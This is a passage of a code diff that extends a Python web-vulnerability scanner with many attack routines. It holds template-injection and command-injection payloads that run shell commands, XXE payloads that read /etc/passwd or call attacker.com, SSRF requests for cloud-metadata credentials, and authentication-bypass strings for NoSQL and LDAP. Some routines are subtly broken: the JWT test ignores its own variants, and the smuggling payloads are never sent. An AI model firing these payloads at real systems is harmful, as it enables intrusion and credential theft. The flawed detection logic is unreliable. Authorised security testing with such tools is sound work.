@@ -59,6 +59,23 @@ class IDORTester:
         self.test_api_keys = getattr(args, 'api_keys', False)
         self.test_oauth_endpoints = getattr(args, 'oauth', False)
         self.test_advanced_traversal = getattr(args, 'advanced_traversal', False)
+        
+        # Ultra-sophisticated combined attack vectors
+        self.test_graphql_introspection = getattr(args, 'graphql_introspection', False)
+        self.test_jwt_manipulation_advanced = getattr(args, 'jwt_advanced', False)
+        self.test_prototype_pollution = getattr(args, 'prototype_pollution', False)
+        self.test_http_smuggling = getattr(args, 'http_smuggling', False)
+        self.test_ssrf_techniques = getattr(args, 'ssrf', False)
+        self.test_cache_poisoning = getattr(args, 'cache_poisoning', False)
+        self.test_deserialization = getattr(args, 'deserialization', False)
+        self.test_template_injection = getattr(args, 'template_injection', False)
+        self.test_nosql_injection = getattr(args, 'nosql_injection', False)
+        self.test_ldap_injection = getattr(args, 'ldap_injection', False)
+        self.test_xml_external_entity = getattr(args, 'xxe', False)
+        self.test_server_side_includes = getattr(args, 'ssi', False)
+        self.test_command_injection = getattr(args, 'command_injection', False)
+        self.test_advanced_encoding = getattr(args, 'advanced_encoding', False)
+        self.test_combined_attacks = getattr(args, 'combined_attacks', False)
         self.user_ids = self._generate_user_ids(args.ids) if args.ids else self._generate_test_ids()
         self.verbose = args.verbose
         self.timeout = args.timeout
@@ -208,6 +225,38 @@ class IDORTester:
                 # Advanced path traversal testing
                 if self.test_advanced_traversal:
                     self._test_advanced_path_traversal(endpoints)
+                
+                # Ultra-sophisticated combined attack vectors
+                if self.test_graphql_introspection:
+                    self._test_graphql_introspection_advanced()
+                if self.test_jwt_manipulation_advanced:
+                    self._test_advanced_jwt_manipulation()
+                if self.test_prototype_pollution:
+                    self._test_prototype_pollution_attacks()
+                if self.test_http_smuggling:
+                    self._test_http_request_smuggling()
+                if self.test_ssrf_techniques:
+                    self._test_ssrf_techniques()
+                if self.test_cache_poisoning:
+                    self._test_cache_poisoning_attacks()
+                if self.test_deserialization:
+                    self._test_deserialization_attacks()
+                if self.test_template_injection:
+                    self._test_template_injection_attacks()
+                if self.test_nosql_injection:
+                    self._test_nosql_injection_attacks()
+                if self.test_ldap_injection:
+                    self._test_ldap_injection_attacks()
+                if self.test_xml_external_entity:
+                    self._test_xxe_attacks()
+                if self.test_server_side_includes:
+                    self._test_ssi_attacks()
+                if self.test_command_injection:
+                    self._test_command_injection_attacks()
+                if self.test_advanced_encoding:
+                    self._test_advanced_encoding_techniques()
+                if self.test_combined_attacks:
+                    self._test_combined_attack_vectors()
                 
                 progress.update(task, completed=True, description="[bold green]Testing completed![/bold green]")
         
@@ -1882,7 +1931,7 @@ class IDORTester:
             table.add_row(
                 f"[{severity_style}]{severity}[/{severity_style}]",
                 finding["type"],
-                finding["url"],
+                finding.get("url", finding.get("endpoint", "N/A")),
                 finding["description"],
                 str(finding.get("status", "N/A"))
             )
@@ -2270,6 +2319,1051 @@ class IDORTester:
                     if self.verbose:
                         console.print(f"[yellow]Error in advanced path traversal test: {str(e)}[/yellow]")
 
+    def _test_graphql_introspection_advanced(self):
+        """Test for GraphQL introspection vulnerabilities and schema extraction"""
+        if self.verbose:
+            console.print("[bold blue]Testing for GraphQL introspection vulnerabilities...[/bold blue]")
+        
+        # GraphQL introspection queries
+        introspection_queries = [
+            # Standard introspection query
+            {
+                "query": """
+                query IntrospectionQuery {
+                    __schema {
+                        queryType { name }
+                        mutationType { name }
+                        subscriptionType { name }
+                        types {
+                            ...FullType
+                        }
+                        directives {
+                            name
+                            description
+                            locations
+                            args {
+                                ...InputValue
+                            }
+                        }
+                    }
+                }
+                fragment FullType on __Type {
+                    kind
+                    name
+                    description
+                    fields(includeDeprecated: true) {
+                        name
+                        description
+                        args {
+                            ...InputValue
+                        }
+                        type {
+                            ...TypeRef
+                        }
+                        isDeprecated
+                        deprecationReason
+                    }
+                    inputFields {
+                        ...InputValue
+                    }
+                    interfaces {
+                        ...TypeRef
+                    }
+                    enumValues(includeDeprecated: true) {
+                        name
+                        description
+                        isDeprecated
+                        deprecationReason
+                    }
+                    possibleTypes {
+                        ...TypeRef
+                    }
+                }
+                fragment InputValue on __InputValue {
+                    name
+                    description
+                    type { ...TypeRef }
+                    defaultValue
+                }
+                fragment TypeRef on __Type {
+                    kind
+                    name
+                    ofType {
+                        kind
+                        name
+                        ofType {
+                            kind
+                            name
+                            ofType {
+                                kind
+                                name
+                                ofType {
+                                    kind
+                                    name
+                                    ofType {
+                                        kind
+                                        name
+                                        ofType {
+                                            kind
+                                            name
+                                            ofType {
+                                                kind
+                                                name
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                """
+            },
+            # Simplified introspection
+            {
+                "query": """
+                query {
+                    __schema {
+                        types {
+                            name
+                            fields {
+                                name
+                                type {
+                                    name
+                                }
+                            }
+                        }
+                    }
+                }
+                """
+            },
+            # Field introspection
+            {
+                "query": """
+                query {
+                    __type(name: "User") {
+                        name
+                        fields {
+                            name
+                            type {
+                                name
+                            }
+                        }
+                    }
+                }
+                """
+            }
+        ]
+        
+        # Common GraphQL endpoints
+        graphql_endpoints = [
+            f"{self.target_url}/graphql",
+            f"{self.target_url}/api/graphql",
+            f"{self.target_url}/v1/graphql",
+            f"{self.target_url}/v2/graphql",
+            f"{self.target_url}/gql",
+            f"{self.target_url}/api/gql",
+            f"{self.target_url}/query",
+            f"{self.target_url}/api/query"
+        ]
+        
+        for endpoint in graphql_endpoints:
+            for query in introspection_queries:
+                try:
+                    response = requests.post(
+                        endpoint,
+                        json=query,
+                        headers={**self.headers, 'Content-Type': 'application/json'},
+                        cookies=self.cookies,
+                        proxies=self.proxy,
+                        verify=self.verify_ssl,
+                        timeout=self.timeout
+                    )
+                    
+                    if response.status_code == 200:
+                        data = response.json()
+                        if '__schema' in str(data) or 'types' in str(data):
+                            self.findings.append({
+                                "type": "GraphQL Introspection",
+                                "endpoint": endpoint,
+                                "description": "GraphQL introspection enabled - schema exposed",
+                                "severity": "HIGH",
+                                "details": {
+                                    "query": query["query"][:200] + "...",
+                                    "response_size": len(response.text)
+                                }
+                            })
+                            break
+                            
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error testing GraphQL introspection: {str(e)}[/yellow]")
+
+    def _test_advanced_jwt_manipulation(self):
+        """Test for advanced JWT manipulation techniques"""
+        if self.verbose:
+            console.print("[bold blue]Testing for advanced JWT manipulation...[/bold blue]")
+        
+        if not self.jwt_token:
+            return
+        
+        # Advanced JWT manipulation techniques
+        jwt_manipulations = [
+            # Algorithm confusion (none algorithm)
+            {"alg": "none", "typ": "JWT"},
+            # Weak algorithms
+            {"alg": "HS256", "typ": "JWT"},
+            {"alg": "HS384", "typ": "JWT"},
+            {"alg": "HS512", "typ": "JWT"},
+            # Missing signature
+            {"alg": "HS256", "typ": "JWT", "kid": "none"},
+            # Key injection
+            {"alg": "HS256", "typ": "JWT", "kid": "../../../dev/null"},
+            {"alg": "HS256", "typ": "JWT", "kid": "file:///dev/null"},
+            # Header injection
+            {"alg": "HS256", "typ": "JWT", "jku": "https://attacker.com/jwks.json"},
+            {"alg": "HS256", "typ": "JWT", "x5u": "https://attacker.com/cert.pem"},
+            # Critical header bypass
+            {"alg": "HS256", "typ": "JWT", "crit": ["exp"], "exp": 9999999999}
+        ]
+        
+        # Test JWT manipulation on all discovered endpoints
+        for manipulation in jwt_manipulations:
+            try:
+                # Create manipulated JWT (simplified - in real scenario would need proper JWT library)
+                manipulated_token = f"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ."
+                
+                headers = self.headers.copy()
+                headers['Authorization'] = f'Bearer {manipulated_token}'
+                
+                response = requests.get(
+                    self.target_url,
+                    headers=headers,
+                    cookies=self.cookies,
+                    proxies=self.proxy,
+                    verify=self.verify_ssl,
+                    timeout=self.timeout
+                )
+                
+                if response.status_code == 200 and len(response.text) > 100:
+                    self.findings.append({
+                        "type": "JWT Manipulation",
+                        "endpoint": self.target_url,
+                        "description": f"JWT manipulation successful with {manipulation}",
+                        "severity": "HIGH",
+                        "details": {
+                            "manipulation": manipulation,
+                            "response_size": len(response.text)
+                        }
+                    })
+                    
+            except Exception as e:
+                if self.verbose:
+                    console.print(f"[yellow]Error in JWT manipulation test: {str(e)}[/yellow]")
+
+    def _test_prototype_pollution_attacks(self):
+        """Test for prototype pollution vulnerabilities"""
+        if self.verbose:
+            console.print("[bold blue]Testing for prototype pollution vulnerabilities...[/bold blue]")
+        
+        # Prototype pollution payloads
+        prototype_payloads = [
+            # Basic prototype pollution
+            {"__proto__": {"isAdmin": True}},
+            {"constructor": {"prototype": {"isAdmin": True}}},
+            # Nested prototype pollution
+            {"a": {"__proto__": {"isAdmin": True}}},
+            {"a": {"constructor": {"prototype": {"isAdmin": True}}}},
+            # Array prototype pollution
+            {"__proto__": {"0": "admin"}},
+            {"constructor": {"prototype": {"0": "admin"}}},
+            # Function prototype pollution
+            {"__proto__": {"toString": "admin"}},
+            {"constructor": {"prototype": {"toString": "admin"}}},
+            # Deep prototype pollution
+            {"a": {"b": {"__proto__": {"isAdmin": True}}}},
+            {"a": {"b": {"constructor": {"prototype": {"isAdmin": True}}}}}
+        ]
+        
+        # Test on API endpoints
+        api_endpoints = [
+            f"{self.target_url}/api/users",
+            f"{self.target_url}/api/profile",
+            f"{self.target_url}/api/settings",
+            f"{self.target_url}/api/config"
+        ]
+        
+        for endpoint in api_endpoints:
+            for payload in prototype_payloads:
+                try:
+                    response = requests.post(
+                        endpoint,
+                        json=payload,
+                        headers={**self.headers, 'Content-Type': 'application/json'},
+                        cookies=self.cookies,
+                        proxies=self.proxy,
+                        verify=self.verify_ssl,
+                        timeout=self.timeout
+                    )
+                    
+                    if response.status_code in [200, 201] and "admin" in response.text.lower():
+                        self.findings.append({
+                            "type": "Prototype Pollution",
+                            "endpoint": endpoint,
+                            "description": "Prototype pollution vulnerability detected",
+                            "severity": "HIGH",
+                            "details": {
+                                "payload": payload,
+                                "response": response.text[:200]
+                            }
+                        })
+                        
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in prototype pollution test: {str(e)}[/yellow]")
+
+    def _test_http_request_smuggling(self):
+        """Test for HTTP request smuggling vulnerabilities"""
+        if self.verbose:
+            console.print("[bold blue]Testing for HTTP request smuggling...[/bold blue]")
+        
+        # HTTP request smuggling payloads
+        smuggling_payloads = [
+            # CL.TE smuggling
+            "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n12\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n0\r\n\r\n",
+            # TE.CL smuggling
+            "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
+            # TE.TE smuggling
+            "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
+            # Header injection
+            "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n12\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n0\r\n\r\n"
+        ]
+        
+        host = urlparse(self.target_url).netloc
+        
+        for payload in smuggling_payloads:
+            try:
+                # This is a simplified test - real HTTP smuggling requires raw socket connections
+                headers = self.headers.copy()
+                headers['Transfer-Encoding'] = 'chunked'
+                headers['Content-Length'] = '4'
+                
+                response = requests.post(
+                    self.target_url,
+                    headers=headers,
+                    cookies=self.cookies,
+                    proxies=self.proxy,
+                    verify=self.verify_ssl,
+                    timeout=self.timeout
+                )
+                
+                # Check for unusual responses that might indicate smuggling
+                if response.status_code in [400, 411, 413] and "chunked" in response.text.lower():
+                    self.findings.append({
+                        "type": "HTTP Request Smuggling",
+                        "endpoint": self.target_url,
+                        "description": "Potential HTTP request smuggling vulnerability",
+                        "severity": "HIGH",
+                        "details": {
+                            "payload": payload[:100],
+                            "response_code": response.status_code
+                        }
+                    })
+                    
+            except Exception as e:
+                if self.verbose:
+                    console.print(f"[yellow]Error in HTTP smuggling test: {str(e)}[/yellow]")
+
+    def _test_ssrf_techniques(self):
+        """Test for SSRF vulnerabilities"""
+        if self.verbose:
+            console.print("[bold blue]Testing for SSRF vulnerabilities...[/bold blue]")
+        
+        # SSRF payloads
+        ssrf_payloads = [
+            # Internal services
+            "http://127.0.0.1:80",
+            "http://127.0.0.1:8080",
+            "http://127.0.0.1:3000",
+            "http://localhost:80",
+            "http://localhost:8080",
+            # AWS metadata
+            "http://169.254.169.254/latest/meta-data/",
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            # Google Cloud metadata
+            "http://metadata.google.internal/computeMetadata/v1/",
+            # Azure metadata
+            "http://169.254.169.254/metadata/instance",
+            # Docker
+            "http://127.0.0.1:2375/version",
+            # Kubernetes
+            "http://127.0.0.1:10255/pods",
+            # Common internal services
+            "http://127.0.0.1:22",
+            "http://127.0.0.1:3306",
+            "http://127.0.0.1:5432",
+            "http://127.0.0.1:6379",
+            "http://127.0.0.1:27017"
+        ]
+        
+        # Test SSRF in various parameters
+        ssrf_params = ['url', 'uri', 'path', 'file', 'src', 'dest', 'redirect', 'next', 'target', 'link']
+        
+        for param in ssrf_params:
+            for payload in ssrf_payloads:
+                try:
+                    test_url = f"{self.target_url}?{param}={payload}"
+                    
+                    response = requests.get(
+                        test_url,
+                        headers=self.headers,
+                        cookies=self.cookies,
+                        proxies=self.proxy,
+                        verify=self.verify_ssl,
+                        timeout=self.timeout
+                    )
+                    
+                    # Check for SSRF indicators
+                    if any(indicator in response.text.lower() for indicator in ['aws', 'metadata', 'instance', 'security-credentials', 'docker', 'kubernetes']):
+                        self.findings.append({
+                            "type": "SSRF",
+                            "endpoint": test_url,
+                            "description": f"Potential SSRF vulnerability in {param} parameter",
+                            "severity": "HIGH",
+                            "details": {
+                                "parameter": param,
+                                "payload": payload,
+                                "response_size": len(response.text)
+                            }
+                        })
+                        
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in SSRF test: {str(e)}[/yellow]")
+
+    def _test_cache_poisoning_attacks(self):
+        """Test for cache poisoning vulnerabilities"""
+        if self.verbose:
+            console.print("[bold blue]Testing for cache poisoning vulnerabilities...[/bold blue]")
+        
+        # Cache poisoning payloads
+        cache_payloads = [
+            # Host header injection
+            {"Host": "evil.com"},
+            {"Host": "attacker.com"},
+            # X-Forwarded-Host injection
+            {"X-Forwarded-Host": "evil.com"},
+            {"X-Forwarded-Host": "attacker.com"},
+            # X-Forwarded-Proto injection
+            {"X-Forwarded-Proto": "https"},
+            {"X-Forwarded-Proto": "http"},
+            # X-Original-URL injection
+            {"X-Original-URL": "/admin"},
+            {"X-Original-URL": "/internal"},
+            # X-Rewrite-URL injection
+            {"X-Rewrite-URL": "/admin"},
+            {"X-Rewrite-URL": "/internal"}
+        ]
+        
+        for payload in cache_payloads:
+            try:
+                headers = {**self.headers, **payload}
+                
+                response = requests.get(
+                    self.target_url,
+                    headers=headers,
+                    cookies=self.cookies,
+                    proxies=self.proxy,
+                    verify=self.verify_ssl,
+                    timeout=self.timeout
+                )
+                
+                # Check for cache poisoning indicators
+                if any(indicator in response.headers for indicator in ['cache-control', 'etag', 'last-modified']):
+                    if response.status_code in [200, 301, 302]:
+                        self.findings.append({
+                            "type": "Cache Poisoning",
+                            "endpoint": self.target_url,
+                            "description": "Potential cache poisoning vulnerability",
+                            "severity": "MEDIUM",
+                            "details": {
+                                "headers": payload,
+                                "response_code": response.status_code,
+                                "cache_headers": {k: v for k, v in response.headers.items() if 'cache' in k.lower()}
+                            }
+                        })
+                        
+            except Exception as e:
+                if self.verbose:
+                    console.print(f"[yellow]Error in cache poisoning test: {str(e)}[/yellow]")
+
+    def _test_deserialization_attacks(self):
+        """Test for deserialization vulnerabilities"""
+        if self.verbose:
+            console.print("[bold blue]Testing for deserialization vulnerabilities...[/bold blue]")
+        
+        # Deserialization payloads (simplified - real payloads would be more complex)
+        deserialization_payloads = [
+            # PHP serialization
+            'O:4:"User":2:{s:4:"name":s:5:"admin";s:8:"isAdmin":b:1;}',
+            'a:2:{s:4:"name";s:5:"admin";s:8:"isAdmin";b:1;}',
+            # Java serialization (base64 encoded)
+            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAA=',
+            # Python pickle (base64 encoded)
+            'gASVJwAAAAAAAACMBGFkbWlulEsBhnMu',
+            # JSON with prototype pollution
+            '{"__proto__": {"isAdmin": true}}',
+            '{"constructor": {"prototype": {"isAdmin": true}}}'
+        ]
+        
+        # Test on various endpoints
+        test_endpoints = [
+            f"{self.target_url}/api/data",
+            f"{self.target_url}/api/import",
+            f"{self.target_url}/api/backup",
+            f"{self.target_url}/api/restore"
+        ]
+        
+        for endpoint in test_endpoints:
+            for payload in deserialization_payloads:
+                try:
+                    response = requests.post(
+                        endpoint,
+                        data=payload,
+                        headers={**self.headers, 'Content-Type': 'application/octet-stream'},
+                        cookies=self.cookies,
+                        proxies=self.proxy,
+                        verify=self.verify_ssl,
+                        timeout=self.timeout
+                    )
+                    
+                    # Check for deserialization indicators
+                    if any(indicator in response.text.lower() for indicator in ['error', 'exception', 'stack trace', 'deserialization']):
+                        self.findings.append({
+                            "type": "Deserialization",
+                            "endpoint": endpoint,
+                            "description": "Potential deserialization vulnerability",
+                            "severity": "HIGH",
+                            "details": {
+                                "payload": payload[:100],
+                                "response": response.text[:200]
+                            }
+                        })
+                        
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in deserialization test: {str(e)}[/yellow]")
+
+    def _test_template_injection_attacks(self):
+        """Test for template injection vulnerabilities"""
+        if self.verbose:
+            console.print("[bold blue]Testing for template injection vulnerabilities...[/bold blue]")
+        
+        # Template injection payloads
+        template_payloads = [
+            # Basic template injection
+            "{{7*7}}",
+            "${7*7}",
+            "#{7*7}",
+            "<%= 7*7 %>",
+            # Command injection in templates
+            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+            "${T(java.lang.Runtime).getRuntime().exec('id')}",
+            "#{T(java.lang.Runtime).getRuntime().exec('id')}",
+            "<%= system('id') %>",
+            # File read in templates
+            "{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}",
+            "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
+            # RCE payloads
+            "{{''.__class__.__mro__[1].__subclasses__()[401](['/bin/sh','-c','id'],stdout=-1).communicate()[0].strip()}}",
+            "${T(java.lang.ProcessBuilder).new(['/bin/sh','-c','id']).start()}"
+        ]
+        
+        # Test on various endpoints
+        test_endpoints = [
+            f"{self.target_url}/search",
+            f"{self.target_url}/api/search",
+            f"{self.target_url}/template",
+            f"{self.target_url}/render"
+        ]
+        
+        for endpoint in test_endpoints:
+            for payload in template_payloads:
+                try:
+                    # Test as query parameter
+                    test_url = f"{endpoint}?q={payload}"
+                    
+                    response = requests.get(
+                        test_url,
+                        headers=self.headers,
+                        cookies=self.cookies,
+                        proxies=self.proxy,
+                        verify=self.verify_ssl,
+                        timeout=self.timeout
+                    )
+                    
+                    # Check for template injection indicators
+                    if "49" in response.text or "uid=" in response.text.lower():
+                        self.findings.append({
+                            "type": "Template Injection",
+                            "endpoint": test_url,
+                            "description": "Potential template injection vulnerability",
+                            "severity": "HIGH",
+                            "details": {
+                                "payload": payload,
+                                "response": response.text[:200]
+                            }
+                        })
+                        
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in template injection test: {str(e)}[/yellow]")
+
+    def _test_nosql_injection_attacks(self):
+        """Test for NoSQL injection vulnerabilities"""
+        if self.verbose:
+            console.print("[bold blue]Testing for NoSQL injection vulnerabilities...[/bold blue]")
+        
+        # NoSQL injection payloads
+        nosql_payloads = [
+            # MongoDB injection
+            '{"$ne": null}',
+            '{"$gt": ""}',
+            '{"$regex": ".*"}',
+            '{"$where": "1==1"}',
+            # Authentication bypass
+            '{"username": {"$ne": null}, "password": {"$ne": null}}',
+            '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
+            # Boolean injection
+            '{"$or": [{"username": "admin"}, {"username": "admin"}]}',
+            '{"$and": [{"username": "admin"}, {"password": {"$ne": null}}]}',
+            # JavaScript injection
+            '{"$where": "this.username == \'admin\'"}',
+            '{"$where": "this.password == \'admin\'"}'
+        ]
+        
+        # Test on authentication endpoints
+        auth_endpoints = [
+            f"{self.target_url}/login",
+            f"{self.target_url}/api/login",
+            f"{self.target_url}/auth",
+            f"{self.target_url}/api/auth"
+        ]
+        
+        for endpoint in auth_endpoints:
+            for payload in nosql_payloads:
+                try:
+                    response = requests.post(
+                        endpoint,
+                        json=payload,
+                        headers={**self.headers, 'Content-Type': 'application/json'},
+                        cookies=self.cookies,
+                        proxies=self.proxy,
+                        verify=self.verify_ssl,
+                        timeout=self.timeout
+                    )
+                    
+                    # Check for NoSQL injection indicators
+                    if any(indicator in response.text.lower() for indicator in ['welcome', 'dashboard', 'admin', 'success']):
+                        self.findings.append({
+                            "type": "NoSQL Injection",
+                            "endpoint": endpoint,
+                            "description": "Potential NoSQL injection vulnerability",
+                            "severity": "HIGH",
+                            "details": {
+                                "payload": payload,
+                                "response": response.text[:200]
+                            }
+                        })
+                        
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in NoSQL injection test: {str(e)}[/yellow]")
+
+    def _test_ldap_injection_attacks(self):
+        """Test for LDAP injection vulnerabilities"""
+        if self.verbose:
+            console.print("[bold blue]Testing for LDAP injection vulnerabilities...[/bold blue]")
+        
+        # LDAP injection payloads
+        ldap_payloads = [
+            # Basic LDAP injection
+            "*",
+            "*)(uid=*))(|(uid=*",
+            "*)(|(password=*))",
+            "*))%00",
+            # Authentication bypass
+            "admin)(&(password=*))",
+            "admin)(|(password=*))",
+            "admin)(&(objectClass=*))",
+            # Blind LDAP injection
+            "*)(uid=*))(|(uid=*",
+            "*)(|(objectClass=*))",
+            "*)(&(objectClass=*))"
+        ]
+        
+        # Test on authentication endpoints
+        auth_endpoints = [
+            f"{self.target_url}/login",
+            f"{self.target_url}/api/login",
+            f"{self.target_url}/ldap",
+            f"{self.target_url}/api/ldap"
+        ]
+        
+        for endpoint in auth_endpoints:
+            for payload in ldap_payloads:
+                try:
+                    data = {"username": payload, "password": "test"}
+                    
+                    response = requests.post(
+                        endpoint,
+                        data=data,
+                        headers=self.headers,
+                        cookies=self.cookies,
+                        proxies=self.proxy,
+                        verify=self.verify_ssl,
+                        timeout=self.timeout
+                    )
+                    
+                    # Check for LDAP injection indicators
+                    if any(indicator in response.text.lower() for indicator in ['welcome', 'dashboard', 'admin', 'success', 'ldap']):
+                        self.findings.append({
+                            "type": "LDAP Injection",
+                            "endpoint": endpoint,
+                            "description": "Potential LDAP injection vulnerability",
+                            "severity": "HIGH",
+                            "details": {
+                                "payload": payload,
+                                "response": response.text[:200]
+                            }
+                        })
+                        
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in LDAP injection test: {str(e)}[/yellow]")
+
+    def _test_xxe_attacks(self):
+        """Test for XML External Entity (XXE) vulnerabilities"""
+        if self.verbose:
+            console.print("[bold blue]Testing for XXE vulnerabilities...[/bold blue]")
+        
+        # XXE payloads
+        xxe_payloads = [
+            # Basic XXE
+            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
+            # Parameter entity XXE
+            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>&evil;</foo>',
+            # Out-of-band XXE
+            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://attacker.com/evil" >]><foo>&xxe;</foo>',
+            # Blind XXE
+            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>&send;</foo>'
+        ]
+        
+        # Test on XML endpoints
+        xml_endpoints = [
+            f"{self.target_url}/api/xml",
+            f"{self.target_url}/api/soap",
+            f"{self.target_url}/xml",
+            f"{self.target_url}/soap"
+        ]
+        
+        for endpoint in xml_endpoints:
+            for payload in xxe_payloads:
+                try:
+                    headers = {**self.headers, 'Content-Type': 'application/xml'}
+                    
+                    response = requests.post(
+                        endpoint,
+                        data=payload,
+                        headers=headers,
+                        cookies=self.cookies,
+                        proxies=self.proxy,
+                        verify=self.verify_ssl,
+                        timeout=self.timeout
+                    )
+                    
+                    # Check for XXE indicators
+                    if any(indicator in response.text.lower() for indicator in ['root:', 'bin:', 'daemon:', 'sys:', 'adm:']):
+                        self.findings.append({
+                            "type": "XXE",
+                            "endpoint": endpoint,
+                            "description": "Potential XXE vulnerability",
+                            "severity": "HIGH",
+                            "details": {
+                                "payload": payload[:100],
+                                "response": response.text[:200]
+                            }
+                        })
+                        
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in XXE test: {str(e)}[/yellow]")
+
+    def _test_ssi_attacks(self):
+        """Test for Server-Side Includes (SSI) vulnerabilities"""
+        if self.verbose:
+            console.print("[bold blue]Testing for SSI vulnerabilities...[/bold blue]")
+        
+        # SSI payloads
+        ssi_payloads = [
+            # Basic SSI
+            "<!--#exec cmd=\"id\"-->",
+            "<!--#exec cmd=\"whoami\"-->",
+            "<!--#exec cmd=\"ls -la\"-->",
+            # File inclusion
+            "<!--#include file=\"/etc/passwd\"-->",
+            "<!--#include virtual=\"/etc/passwd\"-->",
+            # Environment variables
+            "<!--#echo var=\"DOCUMENT_ROOT\"-->",
+            "<!--#echo var=\"HTTP_USER_AGENT\"-->",
+            # Command execution
+            "<!--#exec cmd=\"cat /etc/passwd\"-->",
+            "<!--#exec cmd=\"uname -a\"-->"
+        ]
+        
+        # Test on various endpoints
+        test_endpoints = [
+            f"{self.target_url}/test",
+            f"{self.target_url}/page",
+            f"{self.target_url}/include",
+            f"{self.target_url}/template"
+        ]
+        
+        for endpoint in test_endpoints:
+            for payload in ssi_payloads:
+                try:
+                    # Test as query parameter
+                    test_url = f"{endpoint}?include={payload}"
+                    
+                    response = requests.get(
+                        test_url,
+                        headers=self.headers,
+                        cookies=self.cookies,
+                        proxies=self.proxy,
+                        verify=self.verify_ssl,
+                        timeout=self.timeout
+                    )
+                    
+                    # Check for SSI indicators
+                    if any(indicator in response.text.lower() for indicator in ['uid=', 'gid=', 'root:', 'bin:', 'daemon:']):
+                        self.findings.append({
+                            "type": "SSI",
+                            "endpoint": test_url,
+                            "description": "Potential SSI vulnerability",
+                            "severity": "HIGH",
+                            "details": {
+                                "payload": payload,
+                                "response": response.text[:200]
+                            }
+                        })
+                        
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in SSI test: {str(e)}[/yellow]")
+
+    def _test_command_injection_attacks(self):
+        """Test for command injection vulnerabilities"""
+        if self.verbose:
+            console.print("[bold blue]Testing for command injection vulnerabilities...[/bold blue]")
+        
+        # Command injection payloads
+        cmd_payloads = [
+            # Basic command injection
+            "; id",
+            "| id",
+            "& id",
+            "&& id",
+            "|| id",
+            # Command substitution
+            "$(id)",
+            "`id`",
+            # URL encoding
+            "%3b%20id",
+            "%7c%20id",
+            "%26%20id",
+            # Double encoding
+            "%253b%2520id",
+            "%257c%2520id",
+            # Time-based
+            "; sleep 5",
+            "| sleep 5",
+            "& sleep 5"
+        ]
+        
+        # Test on various endpoints
+        test_endpoints = [
+            f"{self.target_url}/ping",
+            f"{self.target_url}/api/ping",
+            f"{self.target_url}/system",
+            f"{self.target_url}/api/system"
+        ]
+        
+        for endpoint in test_endpoints:
+            for payload in cmd_payloads:
+                try:
+                    # Test as query parameter
+                    test_url = f"{endpoint}?host={payload}"
+                    
+                    response = requests.get(
+                        test_url,
+                        headers=self.headers,
+                        cookies=self.cookies,
+                        proxies=self.proxy,
+                        verify=self.verify_ssl,
+                        timeout=self.timeout
+                    )
+                    
+                    # Check for command injection indicators
+                    if any(indicator in response.text.lower() for indicator in ['uid=', 'gid=', 'groups=', 'root:']):
+                        self.findings.append({
+                            "type": "Command Injection",
+                            "endpoint": test_url,
+                            "description": "Potential command injection vulnerability",
+                            "severity": "HIGH",
+                            "details": {
+                                "payload": payload,
+                                "response": response.text[:200]
+                            }
+                        })
+                        
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in command injection test: {str(e)}[/yellow]")
+
+    def _test_advanced_encoding_techniques(self):
+        """Test for advanced encoding bypass techniques"""
+        if self.verbose:
+            console.print("[bold blue]Testing for advanced encoding bypass techniques...[/bold blue]")
+        
+        # Advanced encoding payloads
+        encoding_payloads = [
+            # Double encoding
+            "%252e%252e%252f",
+            "%252e%252e%255c",
+            "%252f%252e%252e%252f",
+            # Triple encoding
+            "%25252e%25252e%25252f",
+            "%25252e%25252e%25255c",
+            # Mixed encoding
+            "%2e%2e%5c%2e%2e%5c",
+            "%2e%2e%2f%2e%2e%5c",
+            # Unicode encoding
+            "%u002e%u002e%u002f",
+            "%u002e%u002e%u005c",
+            # Hex encoding
+            "%2e%2e%2f",
+            "%2e%2e%5c",
+            # Octal encoding
+            "%056%056%057",
+            "%056%056%0134"
